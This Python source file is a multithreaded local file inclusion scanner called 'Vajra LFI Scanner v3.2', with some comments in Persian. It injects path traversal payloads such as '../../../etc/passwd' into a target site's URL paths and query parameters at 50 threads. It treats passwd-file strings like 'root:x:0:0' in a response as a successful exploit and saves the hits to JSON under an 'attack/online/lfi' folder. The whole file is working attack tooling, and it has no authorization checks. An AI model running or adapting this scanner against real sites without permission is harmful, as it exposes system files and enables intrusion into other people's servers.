#!/usr/bin/env python3
# Vajra LFI Scanner - FAST VERSION (Threaded Optimized)
# v3.2 - Only target domain

import os
import sys
import json
import time
import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


# ---------------- CONFIG ----------------

TIMEOUT = 3
MAX_URLS = 30
THREADS = 50
MAX_RETRIES = 2

LFI_INDICATORS = [
    "root:x:0:0",
    "daemon:",
    "nobody:",
    "bin:",
    "sys:",
    "/bin/bash",
    "www-data",
    "apache",
    "nginx",
]

# Create session with retry and connection pooling
session = requests.Session()
retry_strategy = Retry(
    total=0,
    connect=0,
    read=0,
    status_forcelist=[],
)
adapter = HTTPAdapter(
    pool_connections=100,
    pool_maxsize=100,
    max_retries=retry_strategy,
    pool_block=False
)
session.mount("https://", adapter)
session.mount("http://", adapter)
session.headers.update({
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Accept": "*/*",
    "Connection": "keep-alive",
})

lock = threading.Lock()
test_count = 0
total_tests = 0
error_urls = []
last_progress = 0  
progress_lock = threading.Lock()  
status_stats = {  # <-- اضافه کن
    '200': 0, '201': 0, '204': 0,
    '301': 0, '302': 0, '303': 0, '307': 0,
    '400': 0, '401': 0, '403': 0, '404': 0, '405': 0, '408': 0,
    '429': 0,
    '500': 0, '502': 0, '503': 0, '504': 0,
    'timeout': 0, 'other': 0
}

def show_progress(current, total, phase="Scanning"):
    """نمایش پیشرفت به صورت یه خط با آپدیت"""
    global last_progress
    percent = int((current / total) * 100) if total > 0 else 0
    bar_len = 30
    filled = int(bar_len * current / total) if total > 0 else 0
    bar = '█' * filled + '░' * (bar_len - filled)
    
    with progress_lock:
        if percent != last_progress or current == total:
            last_progress = percent
            print(f"\r{phase}: [{bar}] {current}/{total} ({percent}%)", end='', flush=True)
            if current == total:
                print()  

# ---------------- RESOLVERS ----------------

def resolve_target_folder(target: str) -> str:
    if target.startswith("http://") or target.startswith("https://"):
        return urlparse(target).hostname or "unknown"
    return target.split(":")[0]

def resolve_targets_root():
    current = os.path.dirname(os.path.abspath(__file__))
    root = os.path.abspath(os.path.join(current, "../../../targets"))
    if not os.path.isdir(root):
        print(f"[!] Targets root not found -> {root}")
        sys.exit(1)
    return root

# ---------------- LOAD ----------------

def load_urls(file_path: str):
    if not os.path.isfile(file_path):
        return []
    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        return [l.strip() for l in f if l.strip()]

def load_payloads():
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "payloads.txt")
    if not os.path.isfile(path):
        print(f"[!] Payloads file not found: {path}")
        return ["../../../etc/passwd", "/etc/passwd"]
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        payloads = [l.strip() for l in f if l.strip() and not l.startswith("#")]
    print(f"[+] Loaded {len(payloads)} payloads")
    return payloads

def is_static(url):
    path = urlparse(url).path.lower()
    if "." not in path:
        return False
    return path.split(".")[-1] in {
        "js","css","png","jpg","jpeg","gif","svg","ico","woff","woff2","ttf"
    }

def group_findings(findings):
    grouped = {}
    for finding in findings:
        param_key = finding.get('param', '__PATH__')
        url_base = finding['url'].split('?')[0] if '?' in finding['url'] else finding['url']
        
        if param_key == '__ALL__':
            already_found = False
            for existing in findings:
                if (existing.get('url') == finding['url'] and 
                    existing.get('payload') == finding['payload'] and
                    existing.get('param') != '__ALL__'):
                    already_found = True
                    break
            if already_found:
                continue
        
        key = f"{url_base}|{param_key}"
        
        if key not in grouped:
            grouped[key] = {
                'url': url_base,
                'type': finding['type'],
                'param': finding.get('param'),
                'payloads': [],
                'full_urls': [],
                'status': finding['status'],
                'length': finding['length']
            }
        
        if finding['payload'] not in grouped[key]['payloads']:
            grouped[key]['payloads'].append(finding['payload'])
        
        if finding.get('full_url') and finding['full_url'] not in grouped[key]['full_urls']:
            grouped[key]['full_urls'].append(finding['full_url'])
    
    return list(grouped.values())

# ---------------- CORE TEST ----------------

def build_url(parsed, params, target_param, payload, test_all=False):
    query_parts = []
    for k, v in params.items():
        if k == target_param or test_all:
            query_parts.append(f"{k}={quote(payload, safe='/:%+&?=')}")
        else:
            query_parts.append(f"{k}={quote(v[0], safe='/:%+&?=')}")
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", "&".join(query_parts), ""))

def get_unique_paths(urls):
    """Get unique paths from URLs for path injection testing"""
    paths = set()
    for url in urls:
        parsed = urlparse(url)
        path = parsed.path.rstrip('/')
        
        if path and not is_static(url):
            paths.add(path)
        elif path and is_static(url):
            paths.add(path)
            parent = os.path.dirname(path)
            if parent and parent != '/':
                paths.add(parent)
    
    paths.add("")
    return sorted(paths)

def quick_request(test_url):
    """Make a request with minimal overhead"""
    global status_stats, lock
    try:
        r = session.get(test_url, timeout=TIMEOUT, allow_redirects=False, stream=True)
        content = r.text[:5000]
        r.close()
        
        # ثبت status code
        status_code = str(r.status_code)
        with lock:
            if status_code in status_stats:
                status_stats[status_code] += 1
            else:
                status_stats['other'] += 1
        
        return r.status_code, len(content), content
    except requests.exceptions.Timeout:
        with lock:
            status_stats['timeout'] += 1
        raise
    except Exception as e:
        with lock:
            status_stats['other'] += 1
        raise e

def execute_path_task(task):
    """Execute a single path injection test"""
    global test_count, lock, error_urls, total_tests
    
    t_url = task['url']
    path = task['path']
    payload = task['payload']
    domain = task['domain']
    test_type = task.get('test_type', 'path_payload')
    
    with lock:
        test_count += 1
        current = test_count
    
    show_progress(current, total_tests, "LFI Scanning")
    
    try:
        status, length, content = quick_request(t_url)
        
        if status == 200 and any(i in content for i in LFI_INDICATORS):
            with lock:
                found = [i for i in LFI_INDICATORS if i in content][:2]
                if test_type == 'path_only':
                    print(f"\n    ✅ LFI FOUND! (PATH ONLY: {path}) ({', '.join(found)})")
                else:
                    print(f"\n    ✅ LFI FOUND! ({', '.join(found)})")
            
            return {
                "url": f"{domain}{path or ''}",
                "full_url": t_url,
                "type": "path",
                "payload": payload if payload else "__PATH_ONLY__",
                "status": status,
                "length": length,
                "test_type": test_type,
            }
        
    except Exception as e:
        with lock:
            error_urls.append({
                "url": t_url,
                "type": "path",
                "path": path,
                "payload": payload,
                "error": str(e)[:60]
            })
    
    return None

def execute_param_task(task):
    """Execute a single parameter injection test"""
    global test_count, lock, error_urls, total_tests
    
    url = task['url']
    param = task['param']
    payload = task['payload']
    parsed = task['parsed']
    params = task['params']
    test_all = task.get('test_all', False)
    
    test_url = build_url(parsed, params, param, payload, test_all)
    
    with lock:
        test_count += 1
        current = test_count
    
    show_progress(current, total_tests, "LFI Scanning")
    
    try:
        status, length, content = quick_request(test_url)
        
        if status == 200 and any(i in content for i in LFI_INDICATORS):
            with lock:
                found = [i for i in LFI_INDICATORS if i in content][:2]
                if test_all:
                    print(f"\n    ✅ LFI FOUND! (ALL PARAMS) ({', '.join(found)})")
                else:
                    print(f"\n    ✅ LFI FOUND! ({', '.join(found)})")
            
            return {
                "url": url,
                "full_url": test_url,
                "type": "param",
                "param": param if not test_all else "__ALL__",
                "payload": payload,
                "status": status,
                "length": length,
            }
        
    except Exception as e:
        with lock:
            error_urls.append({
                "url": url,
                "type": "param",
                "param": param,
                "payload": payload,
                "error": str(e)[:60]
            })
    
    return None

def test_path_injection_flat(domain_url, paths, payloads):
    """Create flat task list for path injection"""
    tasks = []
    parsed = urlparse(domain_url)
    domain = f"{parsed.scheme}://{parsed.netloc}"
    
    for path in paths:
        path_prefix = path.rstrip('/') if path else ""
        
        # تست 1: path به تنهایی
        if path_prefix:
            t_url = f"{domain}{path_prefix}/"
        else:
            t_url = f"{domain}/"
        
        tasks.append({
            'url': t_url,
            'path': path,
            'payload': '',
            'domain': domain,
            'test_type': 'path_only',
        })
        
        # تست 2: path + payload
        for payload in payloads:
            if path_prefix:
                t_url = f"{domain}{path_prefix}/{payload}"
            else:
                t_url = f"{domain}/{payload}"
            
            tasks.append({
                'url': t_url,
                'path': path,
                'payload': payload,
                'domain': domain,
                'test_type': 'path_payload',
            })
    
    return tasks

def test_param_injection_flat(urls_with_params, payloads):
    """Create flat task list for parameter injection"""
    tasks = []
    
    for url in urls_with_params:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            continue
        
        for param in params:
            for payload in payloads:
                tasks.append({
                    'url': url,
                    'param': param,
                    'payload': payload,
                    'parsed': parsed,
                    'params': params,
                    'test_all': False,
                })
        
        if len(params) > 1:
            for payload in payloads:
                tasks.append({
                    'url': url,
                    'param': '__ALL__',
                    'payload': payload,
                    'parsed': parsed,
                    'params': params,
                    'test_all': True,
                })
    
    return tasks

def retry_errors():
    """Retry URLs that had errors - MULTI-THREADED for speed"""
    global test_count, lock, error_urls, total_tests
    retry_session = requests.Session()
    retry_session.headers.update(session.headers)
    retry_adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, pool_block=False)
    retry_session.mount("https://", retry_adapter)
    retry_session.mount("http://", retry_adapter)
    
    unique_errors = {}
    for e in error_urls:
        url = e.get('url', '')
        if e['type'] == 'path':
            unique_errors[e.get('url', '')] = e
        else:
            key = f"{url}|{e.get('param')}|{e.get('payload')}"
            unique_errors[key] = e
    
    error_list = list(unique_errors.values())
    
    if not error_list:
        return []
    
    retry_total = len(error_list)
    retry_count = 0
    
    print(f"\n\n[🔄] Retrying {retry_total} failed URLs...")
    
    results = []
    results_lock = threading.Lock()
    
    def retry_single(error_info):
        nonlocal retry_count
        test_url = error_info.get('url', '')
        
        if error_info['type'] == 'path' and 'error' not in error_info.get('url', ''):
            test_url = error_info.get('url', test_url)
        
        if not test_url:
            return None
        
        for attempt in range(MAX_RETRIES):
            try:
                r = retry_session.get(test_url, timeout=TIMEOUT + 2, allow_redirects=False, stream=True)
                content = r.text[:5000]
                r.close()
                
                with lock:
                    retry_count += 1
                    show_progress(retry_count, retry_total, "Retrying")
                
                if r.status_code == 200 and any(i in content for i in LFI_INDICATORS):
                    with lock:
                        print(f"\n    ✅ LFI FOUND ON RETRY! → {test_url[:100]}")
                    
                    return {
                        "url": test_url.split('?')[0] if '?' in test_url else test_url,
                        "full_url": test_url,
                        "type": error_info['type'],
                        "param": error_info.get('param'),
                        "payload": error_info.get('payload', ''),
                        "status": r.status_code,
                        "length": len(content),
                    }
                else:
                    return None
                    
            except Exception as e:
                if attempt == MAX_RETRIES - 1:
                    with lock:
                        retry_count += 1
                        show_progress(retry_count, retry_total, "Retrying")
                        print(f"\n    ❌ FAILED → {test_url[:100]}")
                if attempt < MAX_RETRIES - 1:
                    time.sleep(0.3)
        
        return None
    
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = {ex.submit(retry_single, error_info): error_info for error_info in error_list}
        for f in as_completed(futures):
            try:
                result = f.result()
                if result:
                    with results_lock:
                        results.append(result)
            except:
                pass
    
    print(f"\n[🔄] Retry complete: {len(results)} new findings")
    return results

# ---------------- MAIN ----------------

def main():
    global total_tests
    if len(sys.argv) < 2:
        print("Usage: python3 lfi.py <target>")
        sys.exit(1)

    start = time.time()
    target = sys.argv[1]
    domain = resolve_target_folder(target)

    print("=" * 60)
    print(" Vajra LFI Scanner v3.2 - Only Target Domain")
    print("=" * 60)
    print(f" Target : {domain}")
    print(f" Threads: {THREADS} | Timeout: {TIMEOUT}s")
    print("=" * 60)

    payloads = load_payloads()
    if not payloads:
        sys.exit(1)

    root = resolve_targets_root()
    base = os.path.join(root, domain)
    input_file = os.path.join(base, "attack/online/lfi/urls.txt")
    
    print(f"\n[+] Loading: {input_file}")
    
    if not os.path.isfile(input_file):
        print(f"[-] Not found: {input_file}")
        sys.exit(1)
    
    all_urls = load_urls(input_file)
    
    # ===== فقط دامنه تارگت =====
    target_domain = domain
    filtered_urls = []
    other_domains = 0
    
    for url in all_urls:
        parsed = urlparse(url)
        # فقط URLهایی که دقیقاً دامنه تارگت هستن
        if parsed.netloc == target_domain:
            filtered_urls.append(url)
        else:
            other_domains += 1
    
    if other_domains > 0:
        print(f"[+] Filtered: kept {len(filtered_urls)} URLs from {target_domain}, removed {other_domains} from other domains")
    
    all_urls = list(set(filtered_urls))
    
    print(f"[+] {len(all_urls)} unique URLs loaded")
    
    if not all_urls:
        print("[-] No URLs for target domain!")
        return
    
    # ===== استخراج مسیرها =====
    unique_paths = get_unique_paths(all_urls)
    print(f"[+] {len(unique_paths)} unique paths")
    
    # ===== فقط دامنه تارگت =====
    target_domain_url = f"https://{target_domain}"
    unique_domains = {target_domain_url}
    
    # ===== URLهای با پارامتر =====
    urls_with_params = []
    for u in all_urls:
        if parse_qs(urlparse(u).query):
            urls_with_params.append(u)
    
    urls_with_params = urls_with_params[:MAX_URLS]
    print(f"[+] {len(urls_with_params)} URLs with parameters")
    
    # ===== محاسبه تست‌ها =====
    total_tests = 0
    
    # Path tests
    total_tests += len(unique_paths) * len(unique_domains)  # path-only
    total_tests += len(unique_paths) * len(payloads) * len(unique_domains)  # path+payload
    
    # Param tests
    for url in urls_with_params:
        params = parse_qs(urlparse(url).query)
        total_tests += len(params) * len(payloads)  # هر پارامتر جدا
        total_tests += len(payloads)  # همه پارامترها با هم
    
    print(f"[+] ~{total_tests} tests")
    print("=" * 60)
    print("\n[Starting scan...]")
    
    findings = []
    
    # ===== Phase 1: Path =====
    print(f"\n[Phase 1] PATH ({len(unique_domains)} domain × {len(unique_paths)} paths)")
    
    all_path_tasks = []
    for domain_url in unique_domains:
        all_path_tasks.extend(test_path_injection_flat(domain_url, unique_paths, payloads))
    
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = {ex.submit(execute_path_task, task): task for task in all_path_tasks}
        for f in as_completed(futures):
            try:
                result = f.result()
                if result:
                    findings.append(result)
            except:
                pass
    
    # ===== Phase 2: Param =====
    print(f"\n[Phase 2] PARAM ({len(urls_with_params)} URLs)")
    
    all_param_tasks = test_param_injection_flat(urls_with_params, payloads)
    
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = {ex.submit(execute_param_task, task): task for task in all_param_tasks}
        for f in as_completed(futures):
            try:
                result = f.result()
                if result:
                    findings.append(result)
            except:
                pass
    
    # ===== Phase 3: Retry =====
    retry_findings = retry_errors()
    findings.extend(retry_findings)
    
    elapsed = int(time.time() - start)
    grouped = group_findings(findings)

    # Save errors
    if error_urls:
        error_file = os.path.join(base, "attack/online/lfi", "errors.json")
        os.makedirs(os.path.dirname(error_file), exist_ok=True)
        with open(error_file, "w") as f:
            json.dump({"count": len(error_urls), "errors": error_urls[:500]}, f, indent=2)

    # ===== نتیجه =====
    print("\n" + "=" * 60)
    print(" SCAN FINISHED")
    print("=" * 60)
    print(f" Time     : {elapsed}s")
    print(f" Tests    : {test_count}")
    print(f" Errors   : {len(error_urls)}")
    print(f" Vulns    : {len(grouped)}")
    
    # آمار status codes - نمایش فقط status های با count > 0
    print("\n📊 STATUS CODE STATISTICS:")
    print("-" * 40)
    
    # محاسبه مجموع تست‌های موفق
    total_success = 0
    for code, count in status_stats.items():
        if code not in ['timeout', 'other']:
            total_success += count
    
    # نمایش status code ها
    printed = False
    for code, count in sorted(status_stats.items()):
        if count > 0:
            # رنگ‌بندی ساده
            if code in ['200', '201', '204']:
                prefix = "✅"
            elif code in ['301', '302', '303', '307']:
                prefix = "↪️"
            elif code in ['400', '401', '403', '404', '405']:
                prefix = "❌"
            elif code in ['429']:
                prefix = "⏳"
            elif code in ['500', '502', '503', '504']:
                prefix = "🔥"
            elif code == 'timeout':
                prefix = "⌛"
            else:
                prefix = "❓"
            
            print(f"   {prefix} {code:<10} : {count:,}")
            printed = True
    
    if not printed:
        print("   No status data available")
    
    print("-" * 40)
    print(f"   📊 {'Total Tests':<10} : {test_count:,}")
    if total_success > 0:
        print(f"   ✅ {'2xx/3xx':<10} : {total_success:,}")
    if status_stats.get('timeout', 0) > 0:
        print(f"   ⌛ {'Timeout':<10} : {status_stats['timeout']:,}")
    if status_stats.get('other', 0) > 0:
        print(f"   ❓ {'Other Errors':<10} : {status_stats['other']:,}")
    print(f"   ❌ {'Errors':<10} : {len(error_urls):,}")
    print("=" * 60)
    
    for e in error_urls:
        if 'error' in e:
            if 'timeout' in e.get('error', '').lower() or 'timed out' in e.get('error', '').lower():
                status_stats['timeout'] += 1
            else:
                status_stats['other'] += 1
    
    for f in findings:
        status = str(f.get('status', 0))
        if status in status_stats:
            status_stats[status] += 1
        else:
            status_stats['other'] += 1
    
    printed = False
    for code, count in sorted(status_stats.items()):
        if count > 0:
            print(f"   {code:<10} : {count:,}")
            printed = True
    
    if not printed:
        print("   No status data available")
    
    print("-" * 40)
    print(f"   {'Total Tests':<10} : {test_count:,}")
    print(f"   {'Errors':<10} : {len(error_urls):,}")
    print("=" * 60)

    if not grouped:
        print("\n[-] No LFI found")
        return

    print(f"\n[🔥] {len(grouped)} LFI VULNERABILITIES:")
    print("=" * 60)
    for i, f in enumerate(grouped, 1):
        print(f"\n--- #{i} [{f['type'].upper()}] ---")
        print(f" URL      : {f['url']}")
        if f.get('param'):
            print(f" Param    : {f['param']}")
        print(f" Payloads : {len(f['payloads'])}")
        for p in f['payloads'][:3]:
            print(f"   - {p}")
        if len(f['payloads']) > 3:
            print(f"   ... +{len(f['payloads'])-3} more")
        print(f" Full URLs: {len(f['full_urls'])}")
        for u in f['full_urls'][:2]:
            print(f"   - {u}")
        if len(f['full_urls']) > 2:
            print(f"   ... +{len(f['full_urls'])-2} more")

    # Save results
    out_dir = os.path.join(base, "attack/online/lfi")
    os.makedirs(out_dir, exist_ok=True)
    out_file = os.path.join(out_dir, "lfi_results.json")
    
    with open(out_file, "w") as f:
        json.dump({
            "scan_info": {
                "target": domain,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                "elapsed_seconds": elapsed,
                "total_tests": test_count,
                "errors": len(error_urls),
                "vulnerabilities_found": len(grouped),
                "payloads_count": len(payloads)
            },
            "vulnerabilities": grouped
        }, f, indent=2)

    print(f"\n[+] Saved: {out_file}")
    if error_urls:
        print(f"[+] Errors: {error_file}")
    print("=" * 60)

if __name__ == "__main__":
    main()